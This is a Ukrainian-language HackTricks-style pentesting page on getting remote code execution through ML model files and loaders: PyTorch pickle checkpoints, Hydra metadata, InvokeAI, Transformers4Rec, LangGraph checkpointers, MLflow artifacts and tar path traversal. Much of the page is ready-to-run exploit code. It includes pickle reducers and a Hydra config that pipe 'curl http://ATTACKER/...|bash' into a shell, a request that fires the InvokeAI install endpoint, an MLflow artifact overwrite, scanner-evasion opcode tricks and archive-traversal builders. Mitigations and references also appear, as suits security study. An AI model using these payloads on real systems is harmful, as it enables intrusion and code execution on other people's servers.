# RCE моделей

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей для RCE

Моделі машинного навчання зазвичай поширюються в різних форматах, як-от ONNX, TensorFlow, PyTorch тощо. Розробники можуть завантажувати ці моделі на свої комп’ютери або у виробничі системи для використання. Зазвичай моделі не повинні містити шкідливий код, але в деяких випадках їх можна використати для виконання довільного коду в системі як передбачену функцію або через вразливість у бібліотеці завантаження моделей.

У таблиці нижче наведено характерні вразливості цієї категорії:

| **Фреймворк / інструмент**        | **Вразливість (CVE, якщо доступний)**                                                    | **Вектор RCE**                                                                                                                           | **Джерела**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Небезпечна десеріалізація в* `torch.load` **(CVE-2025-32434)**                                                              | Шкідливий pickle у контрольній точці моделі призводить до виконання коду (обхід захисту `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + завантаження шкідливої моделі призводить до виконання коду; RCE через десеріалізацію Java в API керування                                        | |
| **NVIDIA Merlin Transformers4Rec** | Небезпечна десеріалізація контрольної точки через `torch.load` **(CVE-2025-23298)**                                           | Ненадійна контрольна точка запускає pickle reducer під час `load_model_trainer_states_from_checkpoint` → виконання коду в ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + небезпечний хук розширення MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Керований користувачем ключ `filter` дає змогу впровадити синтаксис SQL/JSON-path, `UNION SELECT` створює фальшивий рядок контрольної точки, після чого десеріалізація `msgpack` імпортує та викликає вибраний зловмисником код Python | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (небезпечний YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з шаром **Lambda** виконує довільний код Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (обробка TFLite)                                                                                          | Спеціально сформована модель `.tflite` спричиняє переповнення цілого числа → пошкодження heap (потенційний RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Завантаження моделі через `joblib.load` виконує pickle з payload зловмисника в `__reduce__`                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (небезпечний `np.load`) *оспорюється*                                                                              | За замовчуванням `numpy.load` дозволяв масиви об’єктів із pickle — шкідливий `.npy/.npz` призводить до виконання коду                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (обхід каталогів) <br> **CVE-2024-5187** (обхід каталогів у tar)                                                    | Шлях до зовнішніх ваг моделі ONNX може виходити за межі каталогу (читання довільних файлів) <br> Шкідливий tar-архів моделі ONNX може перезаписати довільні файли (що призводить до RCE) | |
| ONNX Runtime (ризик дизайну)  | *(Без CVE)* Користувацькі операції ONNX / керування потоком                                                                                    | Для моделі з користувацьким оператором потрібно завантажити нативний код зловмисника; складні графи моделі зловживають логікою для виконання неочікуваних обчислень   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (обхід шляхів)                                                                                          | Використання API завантаження моделей із ввімкненим `--model-control` дає змогу обійти каталоги через відносні шляхи та записувати файли (наприклад, перезаписати `.bashrc` для RCE)    | |
| **GGML (формат GGUF)**      | **CVE-2024-25664 … 25668** (кілька переповнень heap)                                                                         | Некоректний файл моделі GGUF спричиняє переповнення буфера heap у парсері, що дає змогу виконати довільний код у системі жертви                     | |
| **Keras (старі формати)**   | *(Без нових CVE)* Застаріла модель Keras H5                                                                                         | Шкідлива модель HDF5 (`.h5`) із шаром Lambda усе ще виконує код під час завантаження (Keras safe_mode не поширюється на старий формат — “downgrade attack”) | |
| **Інші** (загалом)        | *Недолік дизайну* – серіалізація Pickle                                                                                         | Багато інструментів ML (наприклад, формати моделей на основі pickle, Python `pickle.load`) виконують довільний код, вбудований у файли моделей, якщо не вжити заходів захисту | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Ненадійні метадані передаються в `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Керовані зловмисником метадані/конфігурація моделі задають `_target_` як довільний викликаний об’єкт (наприклад, `builtins.exec`) → виконується під час завантаження навіть із «безпечними» форматами (`.safetensors`, `.nemo`, `config.json` репозиторію) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, існують моделі на основі Python pickle, як-от моделі, що використовуються в [PyTorch](https://github.com/pytorch/pytorch/security), за допомогою яких можна виконати довільний код у системі, якщо завантажувати їх без `weights_only=True`. Отже, будь-яка модель на основі pickle може бути особливо вразливою до цього типу атак, навіть якщо її не наведено в таблиці вище.

### Обхід статичних перевірок контрольних точок на основі pickle

Шлях завантаження моделі, що викликає необмежений `pickle.load()`, `joblib.load()` або `torch.load(..., weights_only=False)`, є точкою виконання, а не просто парсером.<sup>[[22]](#references)</sup> У PyTorch 2.6, якщо не вказано користувацький модуль pickle, для `torch.load()` за замовчуванням використовується `weights_only=True`; наведені нижче приклади потребують необмеженого завантажувача або застосунку, що вимикає цей захист, аби завантажити непідтримуваний об’єкт.<sup>[[4]](#references)</sup> Чистий результат статичного сканування не змінює цієї межі.<sup>[[21]](#references)</sup>

Див. [десеріалізацію Python pickle](../pentesting-web/deserialization/#pickle), щоб ознайомитися з базовим примітивом `__reduce__`, і [список дозволених імпортів ML у Fickling](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling), щоб дізнатися про перевірки імпорту під час виконання.

#### Зареєструвати викликаний об’єкт, а потім знайти його через `EXT2`

Pickle може викликати `copyreg.add_extension` через `REDUCE`, зареєструвавши пару модуль/назва під вибраним зловмисником числовим кодом розширення. Пізніше `EXT2` знаходить цей викликаний об’єкт за кодом, після чого інший `REDUCE` може його викликати. Отже, критичний викликаний об’єкт не є операндом опкоду `GLOBAL` або `STACK_GLOBAL`. Binarly продемонструвала це на прикладі `multiprocessing.util.spawnv_passfds`; чотири з п’яти оцінених сканерів не виявили цю загрозу, тоді як SaferPickle її виявив. Зміна реєстру та пошук через `EXT2` відбуваються в межах тієї самої операції unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Це ескіз opcode, а не повний checkpoint: зовнішній завантажувач має приймати навколишній pickle-потік. Сканер, який шукає небезпечні викликані об’єкти лише серед операндів `GLOBAL`, пропустить пізніший пошук; сканер без підтримки `EXT2` може завершити роботу до винесення вердикту. Навіть суворий allowlist може відхилити сам `copyreg.add_extension`.<sup>[[21]](#references)</sup>

#### Приховування створених типів code object за звичайними функціями

Інший ланцюжок pickle може отримати `FunctionType` через `type(copy.copy)` і `CodeType` через `type(copy.copy.__code__)`, а потім створити code object із наданого bytecode, обгорнути його у функцію та викликати її. У опублікованому варіанті `__code__` отримують через `operator.methodcaller('__getattribute__', '__code__')`, тому pickle не потрібно імпортувати жоден із конструкторів за іменем. Розташування полів `CodeType(...)` і bytecode залежать від версії CPython; payload, створений для іншого інтерпретатора, може завершитися помилкою до виконання. SaferPickle усе ж позначив продемонстрований зразок, але знизив його рівень до `suspicious`; інші чотири оцінені сканери його пропустили.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Запустити завантаження другої моделі з аргументу pickle

Зовнішній pickle може викликати `torch.storage._load_from_bytes`, передавши йому як аргумент серіалізовану модель, надану атакувальником. Ця функція викликає `torch.load(io.BytesIO(b), weights_only=False)`, тому вкладена модель десеріалізується без обмеження `weights_only`, хоча для сканера opcode верхнього рівня це виглядає як передавання байтів одній callable. Зовнішнє завантаження все одно має дозволяти цю callable; `weights_only=True` не змушує зовнішній pickle автоматично приймати її. Сканери, які не аналізують вкладені байти рекурсивно, можуть пропустити внутрішній ланцюжок `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Розв'язати ім'я модуля legacy pickle під час завантаження

Для протоколів pickle нижче 3 параметр Python за замовчуванням `fix_imports=True` перетворює посилання `GLOBAL` на `commands.run` на `subprocess.run` через `_compat_pickle.IMPORT_MAPPING`. Тому сканер, який порівнює буквальний рядок модуля зі списком заборонених `subprocess`, може не виявити callable, що буде викликана під час виконання. Для цього потрібен завантажувач, який зберігає таблицю сумісності та приймає отримані аргументи виклику.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Спрямувати checkpoint не у форматі ZIP повз сканер, який перевіряє лише ZIP

Вибір формату може не спрацювати незалежно від перевірки opcode: Binarly виявила, що ModelScan 0.8.8 спрямовував файли `.bin`, `.pt`, `.pth` і `.ckpt` до спеціалізованого сканера PyTorch для ZIP і пропускав потік pickle не у форматі ZIP, замість того щоб передати його звичайному сканеру pickle. Також було задокументовано застарілий формат моделі TAR, який приймає `torch.load()`, але який не перевіряли ModelScan і JFrog. Це прогалини, специфічні для версій сканерів, а не властивість усіх сканерів моделей.<sup>[[21]](#references)</sup>

#### Виконати код до того, як статичний парсер дійде до некоректного кінця

Сканер, який повністю обходить pickle за допомогою `pickletools.genops()`, може завершитися помилкою на обрізаному opcode після коректного `REDUCE`. Обмежень не має unpickler, який уже викликав callable до того, як зустрів цей кінець, навіть якщо згодом усе завантаження завершиться помилкою. У наведеному прикладі обрізаний `BINUNICODE` ішов одразу після `REDUCE`, який виконував код, через що `pickletools.genops()` завершився помилкою, хоча запис у файл уже відбувся. Це обходить сканер, лише якщо той вважає помилку розбору безпечною або пропускає файл. Це має сенс лише тоді, коли побічний ефект важливий без успішного повернення моделі; ціль, яка вимагає успішного завершення завантаження, може відхилити артефакт.<sup>[[21]](#references)</sup>

### Метадані Hydra → RCE (працює навіть із safetensors)

`hydra.utils.instantiate()` імпортує та викликає будь-який dotted `_target_` в об'єкті конфігурації/метаданих. Коли бібліотеки на кшталт Hugging Face Transformers передають **недовірені метадані моделі** до `instantiate()`, атакувальник може вказати callable та аргументи, які негайно виконаються під час завантаження моделі (pickle не потрібен).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Приклад payload (працює в `model_config.yaml` файлу `.nemo`, `config.json` репозиторію або `__metadata__` усередині `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ключові моменти:
- Спрацьовує до ініціалізації моделі в `restore_from/from_pretrained` у NeMo, кодерах HuggingFace для uni2TS і завантажувачах FlexTok.
- Рядковий block-list Hydra можна обійти альтернативними шляхами імпорту (наприклад, `enum.bltns.eval`) або іменами, визначеними застосунком (наприклад, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok також розбирає рядкові метадані за допомогою `ast.literal_eval`, що дає змогу спричинити DoS (надмірне споживання CPU/пам’яті) до виклику Hydra.

### 🆕  RCE в InvokeAI через `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний вебінтерфейс із відкритим кодом для Stable-Diffusion. У версіях **5.3.1 – 5.4.2** REST endpoint `/api/v2/models/install` дає змогу користувачам завантажувати моделі з довільних URL і завантажувати їх.<sup>[[1]](#references)</sup>

Зрештою endpoint викликає:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Коли наданий файл є **контрольною точкою PyTorch (`*.ckpt`)**, `torch.load` виконує **десеріалізацію pickle**. Оскільки вміст надходить безпосередньо з контрольованої користувачем URL-адреси, зловмисник може вбудувати в контрольну точку шкідливий об’єкт із власним методом `__reduce__`; цей метод виконується **під час десеріалізації**, що призводить до **віддаленого виконання коду (RCE)** на сервері InvokeAI.

Уразливості присвоєно ідентифікатор **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Покрокова інструкція з експлуатації

1. Створіть шкідливу контрольну точку:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Розмістіть `payload.ckpt` на HTTP-сервері, який ви контролюєте (наприклад, `http://ATTACKER/payload.ckpt`).
3. Активуйте вразливу кінцеву точку (автентифікація не потрібна):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → gadget `os.system` запускається, і зловмисник отримує виконання коду в контексті процесу InvokeAI.

Готовий exploit: модуль **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.<sup>[[3]](#references)</sup>

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням **false**)
•  `/api/v2/models/install` доступний зловмиснику
•  Процес має дозволи на виконання команд оболонки

#### Заходи захисту

* Оновіть до **InvokeAI ≥ 5.4.3** — виправлення встановлює `scan=True` за замовчуванням і сканує на наявність malware перед десеріалізацією.<sup>[[2]](#references)</sup>
* Під час програмного завантаження checkpoint-файлів використовуйте `torch.load(file, weights_only=True)` або новий допоміжний засіб [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Встановіть списки дозволених джерел моделей / перевірку підписів і запускайте сервіс із мінімальними привілеями.

> ⚠️ Пам’ятайте, що будь-який формат на основі Python pickle (зокрема багато файлів `.pt`, `.pkl`, `.ckpt`, `.pth`) за своєю суттю небезпечний для десеріалізації з ненадійних джерел.

---

Приклад неформального заходу захисту на випадок, якщо потрібно залишити старі версії InvokeAI запущеними за зворотним проксі:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 RCE у NVIDIA Merlin Transformers4Rec через небезпечний `torch.load` (CVE-2025-23298)

Transformers4Rec від NVIDIA (частина Merlin) використовував небезпечний завантажувач checkpoint, який напряму викликав `torch.load()` для шляхів, указаних користувачем. Оскільки `torch.load` використовує Python `pickle`, checkpoint, контрольований атакувальником, може виконати довільний код через reducer під час десеріалізації.<sup>[[5]](#references)</sup>

Вразливий шлях (до виправлення): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: у Python pickle об’єкт може визначати reducer (`__reduce__`/`__setstate__`), який повертає callable та аргументи. Callable виконується під час unpickling. Якщо такий об’єкт міститься в checkpoint, він запускається до використання будь-яких ваг.

Мінімальний приклад шкідливого checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Вектори доставки та радіус ураження:
- Троянізовані checkpoints/models, поширені через репозиторії, buckets або реєстри артефактів
- Автоматизовані конвеєри resume/deploy, які автоматично завантажують checkpoints
- Виконання відбувається всередині worker-процесів навчання/інференсу, часто з підвищеними привілеями (наприклад, root у контейнерах)

Виправлення: Коміт [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) замінив прямий виклик `torch.load()` на обмежений десеріалізатор із allow-list, реалізований у `transformers4rec/utils/serialization.py`. Новий loader перевіряє типи/поля та не дозволяє викликати довільні callable під час завантаження.<sup>[[7]](#references)</sup>

Рекомендації щодо захисту, специфічні для PyTorch checkpoints:
- Не виконуйте unpickle недовірених даних. За можливості надавайте перевагу форматам, які не містять виконуваного коду, як-от [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX.
- Якщо потрібно використовувати серіалізацію PyTorch, переконайтеся, що встановлено `weights_only=True` (підтримується в новіших версіях PyTorch), або використовуйте власний unpickler із allow-list, подібний до виправлення Transformers4Rec.<sup>[[4]](#references)</sup>
- Перевіряйте походження/підписи моделей і ізолюйте десеріалізацію в sandbox (seccomp/AppArmor; користувач без root; обмежений FS і відсутність вихідного мережевого трафіку).
- Відстежуйте неочікувані дочірні процеси ML-сервісів під час завантаження checkpoint; відстежуйте використання `torch.load()`/`pickle`.

POC і посилання на вразливу версію/виправлення:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Вразливий loader до виправлення: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC зі шкідливим checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader після виправлення: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Приклад – створення шкідливої моделі PyTorch

- Створіть модель:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Завантажте модель:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Десеріалізація Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD від Tencent надає endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердила, що віддалений зловмисник може змусити жертву завантажити шкідливу сторінку/файл, щоб той надіслав у цей endpoint спеціально сформований серіалізований об’єкт і запустив десеріалізацію з правами `root`, що призведе до повної компрометації.

Експлуатація відбувається за типовою схемою зловживання pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Будь-який gadget, досяжний під час десеріалізації (конструктори, `__setstate__`, callbacks фреймворку тощо), можна використати для атаки так само, незалежно від того, чи передавання даних відбувалося через HTTP, WebSocket або файл, поміщений у каталог, за яким ведеться спостереження.



### LangGraph checkpointer SQLi → MessagePack RCE

Цей ланцюжок атак цікавий тим, що зловмиснику **не потрібно завантажувати шкідливий файл моделі**. Натомість застосунок надає **API для збереження стану AI-агента** (`get_state_history(..., filter=...)`), а введені користувачем дані потрапляють до конструктора запитів checkpointer.

#### 1. Структурна SQLi у фільтрах метаданих

Вразливий шаблон SQLite мав такий вигляд:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Значення прив’язується пізніше, але `query_key` конкатенується в **рядок шляху JSON**, тож `'` у ключі словника виходить за межі `'$.{query_key}'` і дає змогу ін’єктувати SQL. Це саме стосується **шляхів JSON, ідентифікаторів, операторів, `LIMIT` і полів TTL**: плейсхолдери захищають лише значення, а не структурний синтаксис запиту.

#### 2. `UNION SELECT` може націлюватися на подальші sink-и, а не лише викрадати дані

Запит повертає `type` і серіалізовані байти `checkpoint`, які згодом використовуються як:

```python
self.serde.loads_typed((type, checkpoint))
```

Це означає, що SQLi у секції `WHERE` може впровадити **підроблений рядок результату**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Якщо подальший код аналізує, десеріалізує, записує або виконує будь-який вибраний стовпець, зіставте ці стовпці з їхніми sinks. У цьому випадку фальшивий рядок перетворює SQLi на **десеріалізацію, контрольовану атакувальником**.

#### 3. Небезпечні extension hooks у MessagePack еквівалентні code gadgets

У шляху `msgpack` в LangGraph використовувався custom extension hook, який розпаковував вкладений кортеж і виконував:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Отже, об’єкт розширення MessagePack, який кодує щось еквівалентне `("os", "system", "id > /tmp/pwned")`, імпортує `os`, знаходить `system` і запускає команду. Під час аудиту AI-фреймворків перевіряйте **власні reviver-и MessagePack/JSON/pickle** на наявність динамічного імпорту, reflection або довільного виклику функцій.

#### 4. Практичний шаблон аудиту agent-фреймворків

Перевірте будь-які контрольовані користувачем вхідні дані, які потрапляють до:
- API для переліку історії стану / пам’яті / відтворення / контрольних точок
- конструкторів структурованих фільтрів, які генерують SQL- або Redis-фрагменти запитів
- власних десеріалізаторів (`pickle`, `msgpack`, хуків об’єктів `json`, конструкторів YAML)
- шляхів відновлення, які довіряють рядкам, отриманим із рівня збереження даних

Цей конкретний ланцюжок загрожував self-hosted-розгортанням LangGraph із контрольними точками **SQLite** або **Redis**, коли ненадійні користувачі могли контролювати `filter`. У розкритті зазначено такі виправлені версії: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` і `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Перезапис артефакту MLflow PyFunc, що призводить до RCE через pickle

MLflow PyFunc, створений на основі `PythonModel`, може зберігати серіалізований об’єкт як `python_model.pkl`. У метаданих моделі вказано `mlflow.pyfunc.model` як завантажувач, а реалізація MLflow використовує це ім’я файлу для збереженої моделі Python. Отже, доступ на запис до сховища артефактів може призвести до виконання коду в іншій програмі, яка згодом завантажить модель.<sup>[[17]](#references)[[18]](#references)</sup>

Корисний ланцюжок: **дозвіл на запис артефактів → заміна pickle → примусове перезавантаження моделлю споживача під час інференсу**. Для експерименту з проксійованим коренем `mlflow-artifacts:/...` перелічіть експеримент, запуск і шлях до артефакту моделі. Сервер відстеження надає `GET` і `PUT` для `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Мінімальний reducer може виконати команду, щойно споживач десеріалізує артефакт за допомогою pickle. Створення payload за допомогою версії Python, зазначеної в `MLmodel`, дає змогу уникнути проблем сумісності.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Запустіть операцію, яка **завантажує наявну модель**, наприклад prediction, scoring або deployment. Не запускайте retraining спочатку, оскільки під час training шкідливий артефакт може бути замінений новою моделлю. Помилка застосунку не спростовує факт експлуатації: reducer повертає цілочисловий код завершення команди замість придатної до використання моделі. Спочатку використайте побічний ефект, який можна спостерігати, наприклад ICMP або HTTP callback, а потім замініть його фінальним payload.<sup>[[20]](#references)</sup>

Під час оцінювання розрізняйте дозвіл на створення run і дозвіл на перезапис артефактів, що належать іншому run. Перевірте автентифікацію та дозволи на оновлення для кожного run, дослідіть несподівані зміни `python_model.pkl` і вважайте походження та цілісність моделі частиною межі виконання. Поточна версія коду MLflow також підтримує параметр `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` і рекомендує використовувати артефакти models-from-code замість завантаження даних cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Відкриті сервери моделей та ML-інфраструктура

Завантаження шкідливої моделі — не єдиний спосіб виконати код в ML-інфраструктурі. API надсилання завдань, кінцеві точки перевірки коду та завантаження моделей із реєстру самостійно розгорнутих AI-сервісів можуть призвести до виконання коду без жодного файлу моделі. Див. [Відкриті самостійно розгорнуті AI-сервіси](AI-Exposed-Self-Hosted-AI-Services.md).

## Моделі для Path Traversal

Як зазначено [**у цій публікації блогу**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, які використовують різні AI-фреймворки, базуються на архівах, зазвичай `.zip`. Тому може бути можливо зловживати цими форматами для атак path traversal, що дасть змогу читати довільні файли в системі, де завантажується модель.<sup>[[16]](#references)</sup>

Наприклад, за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить файл у каталозі `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Або за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить symlink на каталог `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Глибокий аналіз: десеріалізація Keras .keras і пошук gadget

Щоб отримати спеціалізований посібник з внутрішньої будови .keras, RCE через Lambda-layer, проблеми з довільним імпортом у версіях ≤ 3.8 і пошуку gadget після виправлення в allowlist, дивіться:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Блог OffSec – «CVE-2024-12029 – десеріалізація ненадійних даних у InvokeAI»](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Коміт виправлення InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Документація модуля Metasploit від Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – міркування безпеки щодо torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Блог ZDI – CVE-2025-23298: отримання віддаленого виконання коду в NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Рекомендація ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Коміт виправлення Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Вразливий завантажувач до виправлення (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC шкідливої контрольної точки (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Завантажувач після виправлення (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – віддалене виконання коду в сучасних форматах і бібліотеках AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Документація Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Коміт блок-листа Hydra (попередження про RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – від SQLi до RCE: експлуатація Checkpointer у LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Як перетворити вразливості Archive Slip на цінні баунті AI/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Рекомендація Snyk і підтвердження концепції PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Код MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [REST API MLflow – кінцеві точки завантаження та вивантаження артефактів](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Таксономія обходу статичного сканера MLTracer від Binarly](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – виявлення шкідливих моделей за допомогою MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Реалізація PyTorch storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Таблиця сумісності CPython pickle `find_class`](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Таблиця імпорту CPython `_compat_pickle`](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
